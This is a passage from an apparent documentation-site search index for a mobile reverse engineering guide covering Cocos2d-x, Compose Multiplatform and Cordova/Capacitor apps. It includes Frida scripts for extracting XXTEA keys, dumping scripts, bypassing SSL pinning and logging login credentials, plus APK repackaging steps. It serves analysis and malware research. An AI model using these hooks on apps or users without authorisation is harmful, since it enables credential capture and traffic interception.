Process.findModuleByName(\"libcocos2dlua.so\");\nif (cocos) {\n    cocos.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"XXTEAKey\") !== -1 || exp.name.indexOf(\"setXXTEA\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[XXTEA] Key: \" + args[1].readPointer().readCString());\n                    console.log(\"[XXTEA] Sign: \" + args[2].readPointer().readCString());\n                }\n            });\n        }\n    });\n}\n</code></pre> <p>Once the key and sign are known, decrypt offline:</p> <pre><code>import xxtea\nimport sys\n\nKEY = b\"your_xxtea_key_here\"\nSIGN = b\"your_sign_here\"\n\ndef decrypt_file(path, output):\n    with open(path, \"rb\") as f:\n        data = f.read()\n    if data[:len(SIGN)] == SIGN:\n        data = data[len(SIGN):]\n    decrypted = xxtea.decrypt(data, KEY)\n    with open(output, \"wb\") as f:\n        f.write(decrypted)\n\nfor f in sys.argv[1:]:\n    out = f.replace(\".luac\", \"_dec.lua\").replace(\".lua\", \"_dec.lua\")\n    decrypt_file(f, out)\n    print(f + \" -&gt; \" + out)\n</code></pre> <p>After XXTEA decryption, the output is standard Lua bytecode that can be decompiled with unluac.</p>"},{"location":"reversing/frameworks/cocos2d-x/#luajit-bytecode","title":"LuaJIT Bytecode","text":"<p>Some Cocos2d-x builds use LuaJIT instead of standard Lua 5.1. LuaJIT bytecode starts with <code>\\x1bLJ</code> instead of <code>\\x1bLua</code>:</p> <pre><code>xxd -l 4 extracted/assets/src/main.lua\n</code></pre> <p>ljd is the primary LuaJIT decompiler but produces lower quality output than unluac does for standard Lua 5.1:</p> <pre><code>./ljd extracted/assets/src/main.lua &gt; main_decompiled.lua\n</code></pre>"},{"location":"reversing/frameworks/cocos2d-x/#javascript-variant-extraction-analysis","title":"JavaScript Variant -- Extraction &amp; Analysis","text":"<p>JS scripts reside in <code>assets/script/</code> or <code>assets/src/</code>:</p> <pre><code>unzip target.apk \"assets/script/*\" -d extracted/\ngrep -rn \"cc\\.log\\|cc\\.director\\|XMLHttpRequest\\|http\" extracted/assets/script/\n</code></pre> <p>SpiderMonkey bytecode files (<code>.jsc</code>) lack mature open-source decompilers. For <code>.jsc</code> files, focus on string extraction (<code>strings main.jsc</code>), runtime hooking of SpiderMonkey evaluation functions, and intercepting <code>ScriptingCore::evalString</code> in <code>libcocos2djs.so</code>.</p>"},{"location":"reversing/frameworks/cocos2d-x/#pure-c-variant-native-analysis","title":"Pure C++ Variant -- Native Analysis","text":"<p>When no scripting layer is present, all game logic is compiled into the native library. Load <code>libcocos2dcpp.so</code> or <code>libgame.so</code> into Ghidra and focus on classes inheriting from <code>cocos2d::Scene</code>, <code>cocos2d::Layer</code>, and <code>cocos2d::Node</code>.</p> Symbol Pattern Purpose <code>*::init()</code> Scene/layer initialization <code>*::update(float)</code> Per-frame game logic <code>*::onTouchBegan</code> Touch input handling <code>*HttpRequest*</code> Network communication <code>*UserDefault*</code> Local persistent storage"},{"location":"reversing/frameworks/cocos2d-x/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/cocos2d-x/#lua-variant-lual_loadbuffer","title":"Lua Variant -- luaL_loadbuffer","text":"<p>Intercept Lua script loading to dump decrypted bytecode:</p> <pre><code>var luaModule = Process.findModuleByName(\"libcocos2dlua.so\");\nvar luaL_loadbuffer = luaModule.findExportByName(\"luaL_loadbuffer\");\n\nInterceptor.attach(luaL_loadbuffer, {\n    onEnter: function(args) {\n        var buf = args[1];\n        var size = args[2].toInt32();\n        var name = args[3].readCString();\n        console.log(\"[Lua] Loading: \" + name + \" (\" + size + \" bytes)\");\n        if (size &gt; 0) {\n            var outPath = \"/data/local/tmp/cocos_lua/\" + name.replace(/\\//g, \"_\");\n            var f = new File(outPath, \"wb\");\n            f.write(buf.readByteArray(size));\n            f.close();\n        }\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/cocos2d-x/#js-variant-spidermonkey","title":"JS Variant -- SpiderMonkey","text":"<pre><code>var jsModule = Process.findModuleByName(\"libcocos2djs.so\");\njsModule.enumerateExports().forEach(function(exp) {\n    if (exp.name.indexOf(\"evalString\") !== -1 || exp.name.indexOf(\"executeScript\") !== -1) {\n        Interceptor.attach(exp.address, {\n            onEnter: function(args) {\n                try {\n                    var script = args[1].readCString();\n                    if (script &amp;&amp; script.length &lt; 1000) {\n                        console.log(\"[JS] Eval: \" + script.substring(0, 200));\n                    }\n                } catch(e) {}\n            }\n        });\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/cocos2d-x/#native-http-interception","title":"Native HTTP Interception","text":"<pre><code>var cocos = Process.findModuleByName(\"libcocos2dlua.so\") || Process.findModuleByName(\"libcocos2djs.so\");\nif (cocos) {\n    cocos.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"HttpClient\") !== -1 &amp;&amp; exp.name.indexOf(\"send\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[HTTP] HttpClient::send called\");\n                }\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/cocos2d-x/#java-layer-hooks","title":"Java-Layer Hooks","text":"<pre><code>Java.perform(function() {\n    var Cocos2dxActivity = Java.use(\"org.cocos2dx.lib.Cocos2dxActivity\");\n    Cocos2dxActivity.onCreate.implementation = function(bundle) {\n        console.log(\"[Cocos] Activity created\");\n        this.onCreate(bundle);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/cocos2d-x/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Cocos2d-x uses <code>HttpClient</code> based on libcurl or Java's <code>HttpURLConnection</code> depending on the build. For Java-layer pinning:</p> <pre><code>Java.perform(function() {\n    var X509TrustManager = Java.use(\"javax.net.ssl.X509TrustManager\");\n    var SSLContext = Java.use(\"javax.net.ssl.SSLContext\");\n\n    var TrustAll = Java.registerClass({\n        name: \"com.bypass.TrustAll\",\n        implements: [X509TrustManager],\n        methods: {\n            checkClientTrusted: function(chain, authType) {},\n            checkServerTrusted: function(chain, authType) {},\n            getAcceptedIssuers: function() { return []; }\n        }\n    });\n\n    var managers = Java.array(\"javax.net.ssl.TrustManager\", [TrustAll.$new()]);\n    var ctx = SSLContext.getInstance(\"TLS\");\n    ctx.init(null, managers, null);\n    SSLContext.setDefault(ctx);\n});\n</code></pre> <p>For native libcurl-based pinning, hook <code>curl_easy_setopt</code> and disable <code>CURLOPT_SSL_VERIFYPEER</code> (option 64):</p> <pre><code>var libcurl = Process.findModuleByName(\"libcurl.so\");\nif (libcurl) {\n    var curl_easy_setopt = libcurl.findExportByName(\"curl_easy_setopt\");\n    Interceptor.attach(curl_easy_setopt, {\n        onEnter: function(args) {\n            if (args[1].toInt32() === 64) {\n                args[2] = ptr(0);\n            }\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/cocos2d-x/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Lua (Plaintext) Lua (XXTEA) Lua (LuaJIT) JS Pure C++ Code access Direct Key extraction needed Direct bytecode Direct or .jsc Native binary Decompilation Trivial After decryption Moderate (ljd) Trivial or N/A Ghidra/IDA String extraction Trivial After decryption Trivial Trivial Trivial Patching Edit Lua, repack Decrypt, edit, re-encrypt Difficult Edit JS, repack Binary patching Overall difficulty Very Easy Moderate Moderate-Hard Easy Hard <p>The Lua variant with XXTEA encryption is the most commonly encountered configuration in production Cocos2d-x apps. The key is always recoverable from the native library (statically via Ghidra or dynamically via Frida), making XXTEA a speed bump rather than a true barrier. LuaJIT bytecode presents a genuine challenge due to limited decompiler support. Pure C++ builds require full native reverse engineering and represent the hardest Cocos2d-x targets.</p>"},{"location":"reversing/frameworks/cocos2d-x/#references","title":"References","text":"<ul> <li>Cocos2d-x Source</li> <li>unluac -- Lua Decompiler</li> <li>luadec -- Lua Decompiler</li> <li>ljd -- LuaJIT Decompiler</li> <li>XXTEA Python Library</li> <li>Ghidra -- NSA Reverse Engineering Framework</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> </ul>"},{"location":"reversing/frameworks/compose-multiplatform/","title":"Compose Multiplatform","text":"<p>Compose Multiplatform extends Jetpack Compose -- Google's declarative UI toolkit for Android -- to run on iOS, desktop (JVM), and web (Wasm/JS). On Android, Compose Multiplatform produces identical output to standard Jetpack Compose: the Compose compiler plugin transforms <code>@Composable</code> functions into optimized DEX bytecode with a reactive state management system. From a reverse engineering perspective, Compose Multiplatform apps on Android are indistinguishable from apps using regular Jetpack Compose. The framework is developed by JetBrains and builds directly on top of Google's <code>androidx.compose.*</code> libraries.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/compose-multiplatform/#compose-runtime-model","title":"Compose Runtime Model","text":"<p>Compose uses a compiler plugin that transforms declarative <code>@Composable</code> functions into an efficient slot table-based UI tree. The runtime manages state, recomposition (re-rendering when state changes), and the UI node tree.</p> Component Purpose Compose Compiler Plugin Kotlin compiler plugin that transforms <code>@Composable</code> functions at build time Compose Runtime Manages the slot table, state tracking, and recomposition scheduling Compose UI Layout system, drawing, input handling, modifiers Compose Foundation Basic UI components (Row, Column, Box, LazyColumn, Text) Compose Material 3 Material Design component library"},{"location":"reversing/frameworks/compose-multiplatform/#compilation-pipeline","title":"Compilation Pipeline","text":"<pre><code>@Composable functions (Kotlin) \u2500\u2500&gt; Compose Compiler Plugin \u2500\u2500&gt; Kotlin/JVM bytecode \u2500\u2500&gt; D8/R8 \u2500\u2500&gt; DEX\n</code></pre> <p>The Compose compiler plugin runs during Kotlin compilation and transforms <code>@Composable</code> functions into state-aware code that integrates with the Compose runtime's slot table. The output is standard JVM bytecode that flows through the normal Android build pipeline.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#slot-table-recomposition","title":"Slot Table &amp; Recomposition","text":"<p>The Compose runtime maintains a slot table -- a linear array that stores the UI tree structure, state values, and group markers. Each <code>@Composable</code> function call is assigned a group key (an integer derived from its source location) that the runtime uses to track identity across recompositions.</p> <p>When state changes, the runtime uses the slot table to determine which <code>@Composable</code> functions need to re-execute (recompose). Only affected subtrees are re-rendered, not the entire UI.</p> <p>In decompiled output, this manifests as generated code that calls <code>Composer.startRestartGroup()</code>, <code>Composer.endRestartGroup()</code>, <code>Composer.changed()</code>, and other runtime methods wrapping every composable function body.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#identification","title":"Identification","text":"<p>Compose Multiplatform apps are identified the same way as standard Jetpack Compose apps, since they use the same <code>androidx.compose.*</code> libraries on Android.</p> Indicator Location <code>androidx.compose.runtime.*</code> Compose runtime classes in DEX <code>androidx.compose.ui.*</code> Compose UI framework classes <code>androidx.compose.material3.*</code> Material Design 3 components <code>androidx.compose.foundation.*</code> Foundation layout components <code>ComposableSingletons$*</code> Generated singleton classes for lambda composables <code>*Kt$*$*</code> Generated classes from Compose lambda transformations <p>Quick check:</p> <pre><code>jadx -d output/ target.apk\ngrep -r \"androidx.compose\" output/ --include=\"*.java\" -l | head -20\n</code></pre>"},{"location":"reversing/frameworks/compose-multiplatform/#distinguishing-compose-multiplatform-from-jetpack-compose","title":"Distinguishing Compose Multiplatform from Jetpack Compose","text":"<p>On Android, there is no reliable way to distinguish Compose Multiplatform from standard Jetpack Compose. Both produce the same <code>androidx.compose.*</code> classes in DEX. Indirect signals include:</p> Signal Confidence Ktor client present alongside Compose High (KMP networking + Compose UI) <code>org.jetbrains.compose.*</code> resource classes Medium (Compose Multiplatform resource system) Shared module package with Compose code Medium (multiplatform project structure) App available on both Android and iOS with identical UI Contextual (suggests shared UI toolkit) <p>Does It Matter?</p> <p>For reverse engineering purposes, distinguishing Compose Multiplatform from Jetpack Compose is irrelevant. The analysis approach is identical. The distinction only matters for understanding the developer's project structure and whether shared business logic might follow KMP patterns.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#analysis","title":"Analysis","text":""},{"location":"reversing/frameworks/compose-multiplatform/#decompilation-with-jadx","title":"Decompilation with Jadx","text":"<p>Standard jadx decompilation works. Compose apps produce verbose generated code due to the Compose compiler plugin:</p> <pre><code>jadx -d output/ target.apk\n</code></pre>"},{"location":"reversing/frameworks/compose-multiplatform/#understanding-compose-generated-code","title":"Understanding Compose-Generated Code","text":"<p>The Compose compiler transforms every <code>@Composable</code> function. A simple composable in source becomes significantly more complex in decompiled output. Key patterns to recognize:</p> Generated Pattern Meaning <code>Composer.startRestartGroup(int key)</code> Beginning of a composable scope, <code>key</code> identifies the source location <code>Composer.endRestartGroup()</code> End of composable scope, returns <code>ScopeUpdateScope</code> for recomposition <code>Composer.changed(value)</code> Checks if a parameter changed since last composition <code>Composer.skipToGroupEnd()</code> Skips recomposition of this subtree (parameters unchanged) <code>Composer.startReplaceableGroup(int)</code> Non-restartable group (conditional or loop body) <code>$changed</code> parameter Bitmask tracking which parameters changed, used for skip optimization <code>ComposableSingletons$FileName</code> Singleton holder for lambda composables"},{"location":"reversing/frameworks/compose-multiplatform/#reading-decompiled-composables","title":"Reading Decompiled Composables","text":"<p>When analyzing decompiled Compose code, strip away the Composer boilerplate mentally. The actual logic sits between the <code>startRestartGroup</code> and <code>endRestartGroup</code> calls. The <code>$changed</code> bitmask parameters and <code>Composer.changed()</code> checks are optimization scaffolding, not business logic.</p> <p>A decompiled composable that looks like 80 lines typically contains 10-15 lines of actual logic buried in Composer state-tracking calls.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#state-management-patterns","title":"State Management Patterns","text":"<p>Compose state is the primary data flow mechanism. In decompiled output, state holders appear as:</p> Class Purpose <code>MutableStateImpl</code> Wraps a value with change notification (<code>mutableStateOf()</code>) <code>SnapshotStateList</code> Observable list implementation <code>SnapshotStateMap</code> Observable map implementation <code>DerivedSnapshotState</code> Computed state derived from other state values <code>StateFlowKt</code> Kotlin Flow collected as Compose state"},{"location":"reversing/frameworks/compose-multiplatform/#viewmodel-integration","title":"ViewModel Integration","text":"<p>Compose apps typically use Android <code>ViewModel</code> for state management. The ViewModel holds business logic and exposes state as <code>StateFlow</code> or <code>MutableState</code>:</p> <pre><code>grep -r \"ViewModel\" output/ --include=\"*.java\" -l\ngrep -r \"StateFlow\" output/ --include=\"*.java\" -l\n</code></pre> <p>ViewModels contain the bulk of the business logic and are the primary analysis targets -- not the composable UI functions.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#navigation-analysis","title":"Navigation Analysis","text":"<p>Compose Navigation defines the app's screen graph. Analyzing navigation reveals the app's complete screen structure and data flow between screens.</p> <pre><code>grep -r \"NavHost\\|composable(\\|navigation(\" output/ --include=\"*.java\"\n</code></pre> <p>Navigation routes are string-based and often contain hardcoded route patterns that reveal the app's structure:</p> <pre><code>grep -r \"\\\".*/{.*}\\\"\" output/ --include=\"*.java\"\n</code></pre> <p>This finds parameterized routes like <code>\"profile/{userId}\"</code> or <code>\"transaction/{txId}\"</code>.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/compose-multiplatform/#standard-kotlin-hooks","title":"Standard Kotlin Hooks","text":"<p>Compose compiles to standard Kotlin/JVM bytecode. All Frida Java hooks work:</p> <pre><code>Java.perform(function() {\n    var LoginVM = Java.use(\"com.example.app.ui.login.LoginViewModel\");\n    LoginVM.login.overload(\"java.lang.String\", \"java.lang.String\", \"kotlin.coroutines.Continuation\").implementation = function(email, password, cont) {\n        console.log(\"[Compose] login: \" + email + \" / \" + password);\n        return this.login(email, password, cont);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/compose-multiplatform/#hooking-compose-state-changes","title":"Hooking Compose State Changes","text":"<p>Intercept state mutations to observe data flow through the UI:</p> <pre><code>Java.perform(function() {\n    var SnapshotMutableState = Java.use(\"androidx.compose.runtime.SnapshotMutableStateImpl\");\n    SnapshotMutableState.setValue.implementation = function(value) {\n        console.log(\"[Compose State] setValue: \" + value);\n        this.setValue(value);\n    };\n});\n</code></pre> <p>This fires on every <code>mutableStateOf()</code> value change across the entire app, which can be noisy. Filter by inspecting the call stack:</p> <pre><code>Java.perform(function() {\n    var SnapshotMutableState = Java.use(\"androidx.compose.runtime.SnapshotMutableStateImpl\");\n    SnapshotMutableState.setValue.implementation = function(value) {\n        var trace = Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Exception\").$new());\n        if (trace.indexOf(\"com.example.app\") !== -1) {\n            console.log(\"[Compose State] \" + value + \"\\n\" + trace);\n        }\n        this.setValue(value);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/compose-multiplatform/#hooking-recomposition","title":"Hooking Recomposition","text":"<p>Monitor which composables recompose to understand UI update patterns:</p> <pre><code>Java.perform(function() {\n    var Composer = Java.use(\"androidx.compose.runtime.ComposerImpl\");\n    Composer.startRestartGroup.implementation = function(key) {\n        console.log(\"[Recompose] group key: \" + key);\n        return this.startRestartGroup(key);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/compose-multiplatform/#intercepting-network-calls-from-viewmodels","title":"Intercepting Network Calls from ViewModels","text":"<p>Since ViewModels contain the business logic, hooking the repository or API service layer is more effective than hooking UI code:</p> <pre><code>Java.perform(function() {\n    var Retrofit = Java.use(\"retrofit2.Retrofit\");\n    Retrofit.create.implementation = function(service) {\n        console.log(\"[API] Creating service: \" + service.getName());\n        return this.create(service);\n    };\n});\n</code></pre> <p>For Compose Multiplatform apps using Ktor instead of Retrofit:</p> <pre><code>Java.perform(function() {\n    var HttpClient = Java.use(\"io.ktor.client.HttpClient\");\n    HttpClient.execute$ktor_client_core.implementation = function(builder, cont) {\n        console.log(\"[Ktor] Request: \" + builder.getUrl().toString());\n        return this[\"execute$ktor_client_core\"](builder, cont);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/compose-multiplatform/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Compose apps use standard Android networking libraries. The SSL pinning bypass depends on which HTTP client the app uses:</p> OkHttp / RetrofitKtor (Compose Multiplatform) <pre><code>Java.perform(function() {\n    var CertPinner = Java.use(\"okhttp3.CertificatePinner\");\n    CertPinner.check.overload(\"java.lang.String\", \"java.util.List\").implementation = function(host, certs) {\n        console.log(\"[SSL] Bypassed pin for: \" + host);\n    };\n});\n</code></pre> <p>Ktor on Android uses OkHttp as its engine, so the same OkHttp bypass applies. See the Kotlin Multiplatform page for details.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Assessment Code format Standard DEX bytecode Identification Easy -- <code>androidx.compose.*</code> classes present Decompilation Full -- but Compose compiler output is verbose String extraction Standard -- all strings in DEX string pool Control flow recovery Full -- standard Kotlin, but buried in Composer boilerplate Business logic location ViewModels and repositories, not composable functions Hooking Standard Frida Java hooks Patching Standard smali patching workflow Obfuscation ceiling R8/ProGuard, DexGuard, same as native Android Overall difficulty Easy (rank equivalent to native Kotlin apps) <p>The primary challenge with Compose apps is not the framework itself but the volume of generated boilerplate from the Compose compiler plugin. Each <code>@Composable</code> function expands into significantly more bytecode than its source equivalent. The analysis strategy is to focus on ViewModels and repository classes for business logic, treating the composable UI layer as secondary unless UI manipulation or screen-scraping is specifically relevant.</p>"},{"location":"reversing/frameworks/compose-multiplatform/#references","title":"References","text":"<ul> <li>Compose Multiplatform -- JetBrains</li> <li>Jetpack Compose Architecture -- Android Developers</li> <li>Compose Compiler Plugin Documentation</li> <li>Understanding Compose Runtime -- Leland Richardson</li> <li>Compose Navigation Documentation</li> <li>jadx -- Android DEX Decompiler</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> <li>Ktor Client Documentation</li> </ul>"},{"location":"reversing/frameworks/cordova/","title":"Cordova / Ionic / Capacitor","text":"<p>Cordova, Ionic, and Capacitor are WebView-based frameworks that package HTML, CSS, and JavaScript as native Android apps. The entire application UI and logic runs inside a <code>WebView</code>, with a plugin bridge exposing native device APIs (camera, contacts, filesystem) to JavaScript. All three share this fundamental architecture, making them the easiest cross-platform framework family to reverse engineer -- the app's source code ships as plaintext web assets inside the APK. These frameworks are heavily used in SpyLoan predatory lending campaigns due to the rapid development cycle they enable.</p>"},{"location":"reversing/frameworks/cordova/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/cordova/#core-design","title":"Core Design","text":"<p>Every Cordova-family app follows the same pattern: a thin Java/Kotlin shell launches an Android <code>WebView</code> that loads the app's web content from local assets. Native functionality is exposed through a plugin bridge that serializes messages between JavaScript and Java.</p> Component Role WebView <code>android.webkit.WebView</code> instance rendering the HTML/CSS/JS app Web Assets HTML, CSS, JavaScript files bundled in the APK Plugin Bridge Message-passing layer between JS and native Java plugin classes Plugins Java classes exposing native APIs (camera, GPS, contacts, file) to JS Config <code>config.xml</code> (Cordova) or <code>capacitor.config.json</code> (Capacitor) defining app metadata and plugin settings"},{"location":"reversing/frameworks/cordova/#cordova","title":"Cordova","text":"<p>Apache Cordova is the original WebView wrapper. The JavaScript bridge uses <code>cordova.exec()</code> to dispatch calls from JS to native plugin classes. Each plugin call is serialized as a JSON message containing the service name, action, and arguments, sent through <code>CordovaBridge.jsExec()</code> on the Java side. The <code>CordovaWebView</code> class manages the embedded <code>WebView</code> and routes bridge traffic.</p> <p>Key Java classes:</p> Class Purpose <code>org.apache.cordova.CordovaActivity</code> Main activity, initializes the WebView <code>org.apache.cordova.CordovaWebView</code> WebView wrapper managing plugins and bridge <code>org.apache.cordova.CordovaBridge</code> JS-to-native message dispatcher <code>org.apache.cordova.CordovaPlugin</code> Base class for all native plugins <code>org.apache.cordova.PluginManager</code> Registry that loads and routes to plugin instances"},{"location":"reversing/frameworks/cordova/#ionic","title":"Ionic","text":"<p>Ionic is a UI framework layered on top of Cordova (or Capacitor). It provides Angular/React/Vue components styled to match native platform UIs. From a reverse engineering perspective, Ionic adds no new native layer -- it is purely a JavaScript/TypeScript framework. The underlying engine is still Cordova or Capacitor. Ionic apps are identifiable by the <code>ionic.config.json</code> metadata and the <code>@ionic</code> package references in the bundled JavaScript.</p>"},{"location":"reversing/frameworks/cordova/#capacitor","title":"Capacitor","text":"<p>Capacitor is Ionic's successor to Cordova as a native runtime. It was built by the Ionic team to replace Cordova's aging plugin architecture. Key differences from Cordova:</p> Aspect Cordova Capacitor Web asset directory <code>assets/www/</code> <code>assets/public/</code> Config file <code>config.xml</code> <code>capacitor.config.json</code> or <code>capacitor.config.ts</code> Plugin config <code>cordova_plugins.js</code> + <code>config.xml</code> <code>capacitor.plugins.json</code> Bridge class <code>CordovaBridge</code> <code>com.getcapacitor.Bridge</code> Activity base <code>CordovaActivity</code> <code>com.getcapacitor.BridgeActivity</code> Plugin base <code>CordovaPlugin</code> <code>com.getcapacitor.Plugin</code> Native project Generated, not version-controlled Native project is a first-class source artifact Plugin calls <code>cordova.exec(success, error, service, action, args)</code> <code>Capacitor.Plugins.PluginName.method()</code> returning Promises <p>Capacitor's <code>Bridge</code> class is the central dispatch point. It maintains a <code>PluginHandle</code> registry mapping plugin names to Java class instances. JS calls arrive via <code>WebView.postMessage()</code> and are routed through <code>MessageHandler</code> to the target plugin method annotated with <code>@PluginMethod</code>.</p>"},{"location":"reversing/frameworks/cordova/#identification","title":"Identification","text":"Indicator Framework Location <code>assets/www/</code> directory Cordova / Ionic (Cordova) APK root <code>assets/public/</code> directory Capacitor APK root <code>cordova.js</code> Cordova <code>assets/www/cordova.js</code> <code>cordova_plugins.js</code> Cordova <code>assets/www/cordova_plugins.js</code> <code>config.xml</code> with <code>&lt;widget&gt;</code> root Cordova <code>res/xml/config.xml</code> <code>capacitor.config.json</code> Capacitor <code>assets/public/capacitor.config.json</code> or <code>assets/capacitor.config.json</code> <code>capacitor.plugins.json</code> Capacitor <code>assets/capacitor.plugins.json</code> <code>org.apache.cordova.*</code> Cordova DEX classes <code>com.getcapacitor.*</code> Capacitor DEX classes <code>@ionic/core</code> in JS bundles Ionic <code>assets/www/</code> or <code>assets/public/</code> JS files <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(assets/www/|assets/public/|cordova\\.js|capacitor\\.config)\"\n</code></pre>"},{"location":"reversing/frameworks/cordova/#code-location","title":"Code Location","text":"<p>All application logic resides in the web asset directory as plaintext files:</p> <pre><code>assets/www/                    (Cordova)\n  index.html\n  cordova.js\n  cordova_plugins.js\n  js/\n    app.js\n    controllers/\n    services/\n  css/\n  plugins/\n    cordova-plugin-camera/\n    cordova-plugin-contacts/\n\nassets/public/                 (Capacitor)\n  index.html\n  main.XXXXX.js\n  polyfills.XXXXX.js\n  capacitor.config.json\n</code></pre> <p>For Cordova apps, <code>cordova_plugins.js</code> is the manifest listing every installed plugin, its JavaScript file, and the native class it maps to. This file is the starting point for understanding what native capabilities the app uses.</p> <p>For modern Ionic/Capacitor apps using Angular or React, the JavaScript is bundled by webpack or esbuild into chunked files (<code>main.XXXXX.js</code>, <code>vendor.XXXXX.js</code>). These are minified but remain plaintext JavaScript -- no compilation step like Hermes bytecode.</p> <p>Native plugin Java classes are compiled into the DEX and decompilable with jadx. These handle the actual Android API calls that the JavaScript bridge dispatches to.</p>"},{"location":"reversing/frameworks/cordova/#analysis-workflow","title":"Analysis Workflow","text":""},{"location":"reversing/frameworks/cordova/#1-extract-and-inventory","title":"1. Extract and Inventory","text":"<pre><code>unzip target.apk -d extracted/\nls extracted/assets/www/\n</code></pre>"},{"location":"reversing/frameworks/cordova/#2-parse-the-plugin-manifest","title":"2. Parse the Plugin Manifest","text":"<p>For Cordova apps, <code>cordova_plugins.js</code> contains a JSON array of every plugin:</p> <pre><code>cat extracted/assets/www/cordova_plugins.js\n</code></pre> <p>This reveals the installed plugins and their native class mappings. Each entry contains:</p> <ul> <li><code>id</code> -- plugin identifier (e.g., <code>cordova-plugin-camera</code>)</li> <li><code>file</code> -- path to the JS shim</li> <li><code>pluginId</code> -- npm package name</li> <li><code>clobbers</code> -- JS namespace the plugin occupies (e.g., <code>navigator.camera</code>)</li> </ul>"},{"location":"reversing/frameworks/cordova/#3-read-application-javascript","title":"3. Read Application JavaScript","text":"<pre><code>npx prettier --write extracted/assets/www/js/app.js\n</code></pre> <p>The beautified JavaScript is fully readable application source code. Search for:</p> <ul> <li>API endpoints and hardcoded URLs</li> <li>Authentication tokens, API keys, secrets</li> <li>Business logic and data handling</li> <li>C2 endpoints in malicious apps</li> <li>Data exfiltration routines</li> </ul>"},{"location":"reversing/frameworks/cordova/#4-map-plugin-usage","title":"4. Map Plugin Usage","text":"<p>Cross-reference the <code>cordova_plugins.js</code> manifest with actual usage in the app JavaScript. Sensitive plugins to flag:</p> Plugin Concern <code>cordova-plugin-contacts</code> Contact list exfiltration <code>cordova-plugin-camera</code> Photo capture, document harvesting <code>cordova-plugin-file</code> Filesystem access, data staging <code>cordova-plugin-geolocation</code> Location tracking <code>cordova-plugin-sms</code> SMS read/send capabilities <code>cordova-plugin-device</code> Device fingerprinting <code>cordova-plugin-media-capture</code> Audio/video recording <code>cordova-plugin-sms-receive</code> Passive SMS interception"},{"location":"reversing/frameworks/cordova/#5-decompile-native-plugin-code","title":"5. Decompile Native Plugin Code","text":"<pre><code>jadx -d jadx_out/ target.apk\n</code></pre> <p>Examine plugin Java classes for native operations that the JS shims invoke. Look for raw Android API calls that go beyond what the standard plugin interface exposes -- custom plugins frequently embed additional data collection.</p>"},{"location":"reversing/frameworks/cordova/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/cordova/#webviewloadurl-interception","title":"WebView.loadUrl Interception","text":"<p>Intercept all content loaded into the WebView:</p> <pre><code>Java.perform(function() {\n    var WebView = Java.use(\"android.webkit.WebView\");\n\n    WebView.loadUrl.overload(\"java.lang.String\").implementation = function(url) {\n        console.log(\"[WebView] loadUrl: \" + url);\n        this.loadUrl(url);\n    };\n\n    WebView.loadUrl.overload(\"java.lang.String\", \"java.util.Map\").implementation = function(url, headers) {\n        console.log(\"[WebView] loadUrl: \" + url + \" headers: \" + headers);\n        this.loadUrl(url, headers);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/cordova/#evaluatejavascript-injection","title":"evaluateJavascript Injection","text":"<p>Inject JavaScript into the running WebView context:</p> <pre><code>Java.perform(function() {\n    var WebView = Java.use(\"android.webkit.WebView\");\n\n    WebView.evaluateJavascript.implementation = function(script, callback) {\n        console.log(\"[WebView] evaluateJavascript: \" + script.substring(0, 200));\n        this.evaluateJavascript(script, callback);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/cordova/#cordova-bridge-interception","title":"Cordova Bridge Interception","text":"<p>Hook the Cordova bridge to see all JS-to-native plugin calls:</p> <pre><code>Java.perform(function() {\n    var CordovaBridge = Java.use(\"org.apache.cordova.CordovaBridge\");\n\n    CordovaBridge.jsExec.implementation = function(bridgeSecret, service, action, callbackId, arguments) {\n        console.log(\"[Cordova] \" + service + \".\" + action + \" args=\" + arguments);\n        return this.jsExec(bridgeSecret, service, action, callbackId, arguments);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/cordova/#capacitor-bridge-interception","title":"Capacitor Bridge Interception","text":"<p>Hook Capacitor's message handler:</p> <pre><code>Java.perform(function() {\n    var MessageHandler = Java.use(\"com.getcapacitor.MessageHandler\");\n\n    MessageHandler.postMessage.implementation = function(message) {\n        console.log(\"[Capacitor] postMessage: \" + message);\n        this.postMessage(message);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/cordova/#direct-js-modification","title":"Direct JS Modification","text":"<p>The simplest approach for Cordova apps: edit the JavaScript files directly in the extracted APK, repackage, and resign. No decompilation or bytecode patching needed.</p> <pre><code>unzip target.apk -d repack/\nvi repack/assets/www/js/app.js\ncd repack &amp;&amp; zip -r ../modified.apk . &amp;&amp; cd ..\nzipalign -v 4 modified.apk 